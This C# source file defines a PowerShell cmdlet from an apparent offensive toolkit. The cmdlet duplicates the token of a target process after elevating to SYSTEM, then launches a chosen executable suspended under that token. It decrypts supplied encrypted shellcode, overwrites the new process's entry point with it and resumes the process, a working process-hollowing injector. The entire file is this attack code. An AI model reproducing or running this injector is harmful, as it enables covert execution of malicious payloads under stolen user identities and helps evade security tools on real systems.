using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using TurtleToolKitManaged;
using TurtleToolKitImpersonate;
using TurtleToolKitOutputs;
using System.Management.Automation;
using System.Runtime.InteropServices;
using TurtleToolKitCrypt;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "ImpersonateProcessHollow")] // <- seeting cmdlet name and verbs
    [Alias("INVPROCHOLLO")] //<- cmdlet alias
    public class ImpersonateProcessHollow : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("pid")] public int processId { get; set; }
        [Parameter(Mandatory = true)] [Alias("e")] public string exe { get; set; }
        [Parameter(Mandatory = true)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = true)] [Alias("encsh")] public byte[] shellCode { get; set; }
        [Parameter(Mandatory = true)] [Alias("ivk")] public byte[] initVector { get; set; }

        public static List<TokenObjects> tokensList;
        public static string exePath;
        public static Cryptor cryptObj;
        public static byte[] payload;
        public static SuccessObject success = new SuccessObject { Success = false };
        protected override void BeginProcessing(){
            base.BeginProcessing();
            exePath = exe;
            cryptObj = new Cryptor(decryptKey, initVector);
            payload = shellCode;
  
        }
        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            if (!ImpersonateUserViaTokenProcessHollow(processId))
            {
                WriteWarning("Failed to impersonate and process hollow");
                return;
            }
            WriteVerbose("Success");
            success.Success = true;
        }
        protected override void EndProcessing() { 
            base.EndProcessing();
            WriteObject(success);
        }
        protected override void StopProcessing() { base.StopProcessing(); }
        public static bool ImpersonateUserViaTokenProcessHollow(int pid)
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                //Console.WriteLine("Failed to get system before impersonating user");
                return false;
            }
            if (!ExecuteProcessHollow(cryptObj, payload, pid, exePath))
            {
                //Console.WriteLine("Failed proc hollow");
                Impersonator.RevokePrivs();
                return false;
            }
            Impersonator.RevokePrivs();
            return true;
        }

        private static bool ExecuteProcessHollow(Cryptor crypt, byte[] payloadBytes, int pid, string exepath)
        {
            /// took existing proc hollow code and added createprocesswithtoken instead of createprocess
            var allAccessFlags = Win32.ProcessAccessFlags.All;
            IntPtr hProcess1 = Win32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess1 == IntPtr.Zero)
            {
                //Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess1, Win32.TOKEN_ASSIGN_PRIMARY | Win32.TOKEN_QUERY | Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
            {
                //Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }

            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            // impersonate logged on user with duplicated token

            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
            if (!Win32.DuplicateTokenEx(hToken, (uint)0x02000000L, IntPtr.Zero, 2, 1, out DuplicatedToken))
            {
                //Console.WriteLine("Failed to dupe token {0}", Marshal.GetLastWin32Error());
                return false;
            }
            //if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED -> 0x02000000L, NULL, seImpersonateLevel  = 2, tokenType TOKENPRIMARY = 1, &newToken))
            //ret = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY = 2, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE NEW CONSOLE 10, NULL, NULL, &si, &pi);
            // bool res = TurtleToolKitManaged.Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            if (!Win32.CreateProcessWithTokenW(DuplicatedToken, Win32.LogonFlags.NetCredentialsOnly, exepath, null, Win32.CreationFlags.Suspended, IntPtr.Zero, null, ref si, out pi))
            {
                //Console.WriteLine("Failed to create process {0}", Marshal.GetLastWin32Error());
                return false;
            }
            TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION bi = new TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            //Console.WriteLine(pi.dwProcessId);

            TurtleToolKitManaged.Win32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            Console.WriteLine(nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            var decryptedBytes = crypt.DecryptBytes(payloadBytes);
            if (decryptedBytes == null)
            {
                //Console.WriteLine("Failed to decrypt bytes");
                return false;
            }
            // Perform Decrypt heres
            TurtleToolKitManaged.Win32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
            TurtleToolKitManaged.Win32.ResumeThread(pi.Thread);
            //Console.WriteLine("::: Successfully Execute ProcessHollow via -> {0} :::", exepath);
            Win32.CloseHandle(hProcess);
            Win32.CloseHandle(DuplicatedToken);
            Win32.CloseHandle(hToken);
            return true;
        }
    }
}